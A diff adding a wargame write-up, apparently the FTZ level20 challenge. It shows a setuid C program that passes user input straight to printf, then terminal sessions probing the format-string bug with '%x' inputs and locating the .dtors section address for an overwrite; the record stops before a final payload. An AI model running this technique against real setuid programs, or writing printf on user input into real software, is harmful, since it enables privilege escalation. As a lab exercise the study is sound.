@@ -14,10 +14,51 @@
 
 #include <stdio.h>
 main(int argc,char **argv)
-{ char bleh[80];
+{ 
+  char bleh[80];
   setreuid(3101,3101);
   fgets(bleh,79,stdin);
   printf(bleh);
 }
 ```
+
+In the hint, I could see the printf(bleh) that I might exploit with FSB.
+
+```
+[level20@ftz level20]$ ./attackme
+AAA
+AAA
+[level20@ftz level20]$ ./attackme
+%x
+4f
+[level20@ftz level20]$ ./attackme
+AAAA %x %x %x %x
+AAAA 4f 4212ecc0 4207a750 41414141
+```
+
+4f means 79 in decimal, it seeams that I could exploit iu fourth.
+
+```
+[level20@ftz level20]$ gdb tmp/attackme
+(gdb) disass main
+No symbol "main" in current context.
+```
+
+I could not see the symbol, so I will get information with objdump.
+
+```
+[level20@ftz level20]$ objdump -h attackme
+
+attackme:     file format elf32-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+
+ 18 .dtors        00000008  08049594  08049594  00000594  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+```
+
+__DOTR-List's address is 0x08049594 which I will exploit with this.
+
+
 
